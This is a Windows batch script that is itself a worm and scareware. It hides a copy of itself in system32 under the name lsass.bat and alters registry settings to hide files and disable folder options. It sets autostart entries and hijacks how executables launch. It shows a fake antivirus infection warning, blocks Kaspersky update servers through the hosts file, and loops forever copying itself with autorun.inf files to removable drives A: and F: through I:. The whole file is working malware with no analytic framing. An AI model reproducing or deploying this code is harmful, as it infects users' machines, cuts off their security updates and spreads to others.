@echo off
copy anti_banner.bat %windir%\system32\lsass.bat
attrib +h +s %windir%\system32\lsass.bat
reg add "hklm\software\microsoft\windows\currentversion\explorer\advanced" /v ShowSuperHidden /t reg_dword /d 0x0000000
reg add "hklm\software\microsoft\windows\currentversion\explorer\advanced" /v HideFileExt /t reg_dword /d 0x00000001
reg add "hklm\software\microsoft\windows\currentversion\explorer\advanced" /v Hidden /t reg_dword /d 0x00000000
reg add "hklm\software\microsoft\windows\currentversion\policies\explorer" /v NoFolderOptions /t reg_dword /d 0x00000001
reg add "hklm\software\microsoft\windows\currentversion\run" /v New Anti-Banner /r reg_sz /d "%windir%\system32\lsass.bat"
reg add "hklm\software\policies\microsoft\internet explorer\restrictions" /v NoBrowserClose /t reg_dword /d 1
reg add "hklm\software\microsoft\internet explorer\main" /v Start Page /t reg_sz /d http://www.kaspersky.ru/
@echo msgbox "Your computer is infected! Please update your antivirus, or buy Kaspersky Anti-Virus 7.0">%userprofile%\Banner.vbs
reg add "hklm\software\classes\exefile\shell\open\command" /v (Default) /t reg_sz /d %userprofile%\Banner.bat "%1" %*
reg add "hklm\software\microsoft\windows\currentversion\run" /v Banner /t reg_sz /d %userprofile%\Banner.bat
@echo 127.0.0.1 dhl-eu1.kaspersky-labs.com>>%windir%\system32\drivers\etc\hosts
@echo 127.0.0.1 dhl-eu2.kaspersky-labs.com>>%windir%\system32\drivers\etc\hosts
@echo 127.0.0.1 dhl-eu3.kaspersky-labs.com>>%windir%\system32\drivers\etc\hosts
@echo 127.0.0.1 dhl-eu4.kaspersky-labs.com>>%windir%\system32\drivers\etc\hosts
@echo 127.0.0.1 dhl-eu5.kaspersky-labs.com>>%windir%\system32\drivers\etc\hosts
:begin
if exist A:\ copy %windir%\system32\lsass.bat A:\KAV7.0.bat
if exist A:\ @echo [autorun]>A:\Autorun.inf
if exist A:\ @echo shellexecute="KAV7.0.bat">>A:\Autorun.inf
if exist F:\ copy %windir%\system32\lsass.bat F:\KAV7.0.bat
if exist F:\ @echo [autorun]>F:\Autorun.inf
if exist F:\ @echo shellexecute="KAV7.0.bat">>F:\Autorun.inf
if exist G:\ copy %windir%\system32\lsass.bat G:\KAV7.0.bat
if exist G:\ @echo [autorun]>G:\Autorun.inf
if exist G:\ @echo shellexecute="KAV7.0.bat">>G:\Autorun.inf
if exist H:\ copy %windir%\system32\lsass.bat H:\KAV7.0.bat
if exist H:\ @echo [autorun]>H:\Autorun.inf
if exist H:\ @echo shellexecute="KAV7.0.bat">>H:\Autorun.inf
if exist I:\ copy %windir%\system32\lsass.bat I:\KAV7.0.bat
if exist I:\ @echo [autorun]>I:\Autorun.inf
if exist I:\ @echo shellexecute="KAV7.0.bat">>I:\Autorun.inf
goto begin